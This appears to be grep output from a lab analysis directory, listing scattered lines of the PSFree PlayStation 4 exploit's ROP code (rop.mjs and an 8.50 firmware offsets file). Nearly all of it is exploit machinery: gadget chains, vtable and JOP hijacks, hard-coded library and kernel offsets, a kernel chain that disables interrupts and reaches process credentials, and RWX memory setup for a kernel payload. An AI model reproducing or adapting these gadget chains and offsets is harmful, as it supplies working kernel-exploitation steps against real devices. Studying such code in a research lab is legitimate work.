+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:456:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:458:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:461:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:462:        this.push_value(this.get_gadget('ret'));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:463:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:465:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:467:        this.push_call(this.get_gadget('longjmp'), this.jmp_buf_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:480:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:482:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:496:    syscall(...args) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:498:            throw Error('syscall() needs an empty chain');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:500:        this.push_syscall(...args);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:518:        // Only offset 0x1c8 will be used when calling the scrollLeft getter
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:531:        // 0x1c8 is the offset of the scrollLeft getter native function
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:532:        rw.write64(vtable, 0x1c8, this.get_gadget(ta_jop1));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:533:        rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:534:        rw.write64(vtable, 0x5f, this.get_gadget(ta_jop3));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:541:        rw.write64(rax_ptrs, 0x68, this.get_gadget(jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:542:        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop3));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:543:        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:544:        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:548:        const jop_buffer = new Uint8Array(8);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:549:        const jop_buffer_p = get_view_vector(jop_buffer);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:550:        this.jop_buffer = jop_buffer;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:552:        rw.write64(jop_buffer, 0, rax_ptrs_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:554:        rw.write64(vtable, 8, jop_buffer_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:573:    [libwebkit_base, libkernel_base, libc_base] = get_bases();
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:575:    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:576:    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:577:    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:578:    debug_log('syscall_array:');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:579:    debug_log(syscall_array);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:580:    Chain.init_class(gadgets, syscall_array);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:583:function test_rop(Chain) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:589:    setjmp_addr = gadgets.get('setjmp');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:590:    longjmp_addr = gadgets.get('longjmp');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:595:    chain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:623:    chain.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:626:    chain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:632:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:634:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:640:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:642:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:655:    chain.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:658:    chain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:664:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:666:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:672:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:674:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:683:    debug_log('test syscall getuid()');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:685:    // Set the return value to some random value. If the syscall worked, then
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:690:    chain.syscall('getuid');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:694:        die('syscall getuid failed');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:698:function mlock_gadgets(gadgets) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:701:    for (const [gadget, addr] of gadgets) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:702:        // change this if you use longer gadgets
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:703:        const max_gadget_length = 0x50;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:704:        chain.push_syscall('mlock', addr, max_gadget_length);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:716:    chain.syscall('mlock', stack_buffer_p, stack_buffer.byteLength);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:717:    chain.syscall('mlock', kchain.retval_addr, kchain._return_value.length);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:718:    chain.syscall('mlock', kchain.jmp_buf_p, kchain.jmp_buf.length);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:729:    chain.syscall(
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:745:    const filterops = knote.add(0x4000);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:746:    const jop_buffer = knote.add(0x8000);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:749:    const offset_kn_fop = 0x68;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:750:    knote.write64(0, jop_buffer);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:751:    knote.write64(offset_kn_fop, filterops);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:753:    const offset_f_detach = 0x10;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:754:    filterops.write64(offset_f_detach, kchain.get_gadget(kjop1));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:756:    jop_buffer.write64(0, rax_ptrs);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:759:    rax_ptrs.write64(0xe0, kchain.get_gadget(jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:760:    rax_ptrs.write64(0x30, kchain.get_gadget(jop3));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:761:    rax_ptrs.write64(0x10, kchain.get_gadget(jop4));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:768:    rax_ptrs.write64(0, kchain.get_gadget('cli; jmp qword ptr [rax + 0x43]'));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:769:    rax_ptrs.write64(0x43, kchain.get_gadget(jop5));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:774:    // * offset relative to the return address of the first f_detach()
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:777:    const offset_kqueue_close_epi = 689;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:778:    // offset relative to epi
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:779:    const offset_socketops = 0x179f39f;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:782:    kchain.push_gadget('xchg rbp, rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:784:    kchain.push_gadget('add rax, 8; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:786:    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:787:    // ret_addr += offset_kqueue_close_epi
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:788:    kchain.push_gadget('pop rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:789:    kchain.push_constant(offset_kqueue_close_epi);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:790:    kchain.push_gadget('add rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:793:    kchain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:795:    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:799:    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:802:    kchain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:804:    kchain.push_gadget('add rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:805:    kchain.push_gadget('xchg rbp, rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:808:    kchain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:810:    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:812:    // socketops.fo_chmod = k2jop1
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:813:    kchain.push_gadget('pop rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:814:    kchain.push_constant(offset_socketops + 0x40);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:815:    kchain.push_gadget('add rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:818:    kchain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:820:    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:821:    kchain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:822:    kchain.push_value(kchain.get_gadget(k2jop1));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:823:    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:826:    kchain.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:828:    kchain.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:830:    kchain.push_gadget('mov qword ptr [rdi], rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:835:    // jmp gadgets['sti; ret']
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:836:    kchain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:837:    kchain.push_value(kchain.get_gadget('sti; ret'));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:838:    kchain.push_gadget('leave; jmp rcx');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:840:    chain.syscall('mlock', knote, size);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:843:    return [knote, size, jop_buffer, rax_ptrs];
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:856:        chain.push_syscall('kqueue');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:857:        chain.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:859:        chain.push_gadget('mov dword ptr [rdi], eax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:868:    chain.syscall('socket', AF_INET, SOCK_STREAM, 0);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:896:        chain.push_syscall('kevent', kqueues[i], kevent_p, 1, 0, 0, 0);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:904:        chain.push_syscall('close', kqueues[i]);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:915:        chain.push_syscall('close', kqueues[i]);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:937:    const offset_jmp_buf_rcx = 0x10;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:938:    const offset_thread_td_proc = 8;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:939:    const offset_proc_p_ucred = 0x40;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:945:    kchain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:947:    kchain.push_gadget('pop rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:948:    kchain.push_constant(offset_jmp_buf_rcx);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:949:    kchain.push_gadget('add rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:950:    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:952:    kchain.push_gadget('pop rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:953:    kchain.push_constant(offset_thread_td_proc);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:954:    kchain.push_gadget('add rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:955:    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:957:    kchain.push_gadget('pop rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:958:    kchain.push_constant(offset_proc_p_ucred);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:959:    kchain.push_gadget('add rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:960:    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:969:    kchain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:972:    kchain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:973:    kchain.push_value(kchain.get_gadget('sti; ret'));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:974:    kchain.push_gadget('leave; jmp rcx');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:976:    chain.syscall('fchmod', sd, mmap_area);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1000:    kchain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1003:    kchain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1004:    kchain.push_value(kchain.get_gadget('sti; ret'));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1005:    kchain.push_gadget('leave; jmp rcx');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1008:    chain.syscall('fchmod', sd, mmap_area);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1012:function kexec_payload() {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1024:    chain.syscall('jitshm_create', 0, map_size, prot_rwx);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1027:    chain.syscall('jitshm_alias', exec_handle, prot_rw);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1030:    chain.syscall(
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1041:    chain.syscall(
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1080:    mlock_gadgets(gadgets);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1085:        jop_buffer,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1090:    // offset relative to kernel base
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1091:    const offset_k_socketops_fo_chmod = 0x1a76060;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1092:    const kbase = kretval.sub(offset_k_socketops_fo_chmod);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1096:    mmap_area.write64(8, jop_buffer);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1097:    rax_ptrs.write64(0x70, kchain.get_gadget(jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:1106:    //kexec_payload();
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:30:    find_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:32:    resolve_import,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:33:    init_syscall_array,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:37:import * as o from './module/offset.mjs';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:43:const syscall_array = [];
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:45:const offset_func_exec = 0x18;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:46:const offset_textarea_impl = 0x18;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:47:const offset_js_inline_prop = 0x10;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:49:// WebKit offsets of imported functions
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:50:const offset_wk_stack_chk_fail = 0x8D8;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:51:const offset_wk_memcpy = 0x8E8;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:53:// libSceLibcInternal offsets
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:54:const offset_libc_setjmp = 0x25904;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:55:const offset_libc_longjmp = 0x29C38;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:71:let libwebkit_base = null;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:72:// libkernel_web.sprx
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:73:let libkernel_base = null;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:77:// Chain implementation based on Chain803. Replaced offsets that changed
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:78:// between versions. Replaced gadgets that were missing with new ones that
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:81:// gadgets for the JOP chain
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:83:// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:84:// because jop1-5 was the original chain used by the old implementation of
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:85:// Chain803. Now the sequence is ta_jop1-3 then to jop2-5.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:89:const ta_jop1 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:97:// ta_jop1 pushed another object (via the call instruction) but we want no
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:99:// jop2 later. So we pop the return address pushed by ta_jop1.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:102:const ta_jop2 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:106:const ta_jop3 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:113:const jop2 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:119:const jop3 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:124:const jop4 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:128:const jop5 = 'pop rsp; ret';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:142:const rop_epilogue = 'leave; ret';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:144:const webkit_gadget_offsets = new Map(Object.entries({
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:181:    [jop2] : 0x00000000011c9df0,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:182:    [jop3] : 0x0000000000481769,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:183:    [jop4] : 0x00000000021f10fd,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:185:    [ta_jop1] : 0x0000000000c42d34,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:186:    [ta_jop2] : 0x00000000021f930e,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:187:    [ta_jop3] : 0x0000000001236532,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:190:const libc_gadget_offsets = new Map(Object.entries({
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:194:    'setjmp' : offset_libc_setjmp,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:195:    'longjmp' : offset_libc_longjmp,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:198:const gadgets = new Map();
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:202:    const webcore_textarea = mem.addrof(textarea).readp(offset_textarea_impl);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:204:    const libwebkit_base = find_base(textarea_vtable, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:207:        libwebkit_base
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:208:        .add(offset_wk_stack_chk_fail)
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:210:    const stack_chk_fail_addr = resolve_import(
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:215:    const libkernel_base = find_base(stack_chk_fail_addr, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:217:    const memcpy_import = libwebkit_base.add(offset_wk_memcpy);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:218:    const memcpy_addr = resolve_import(memcpy_import, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:219:    const libc_base = find_base(memcpy_addr, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:222:        libwebkit_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:223:        libkernel_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:228:function init_gadget_map(gadget_map, offset_map, base_addr) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:229:    for (const [insn, offset] of offset_map) {
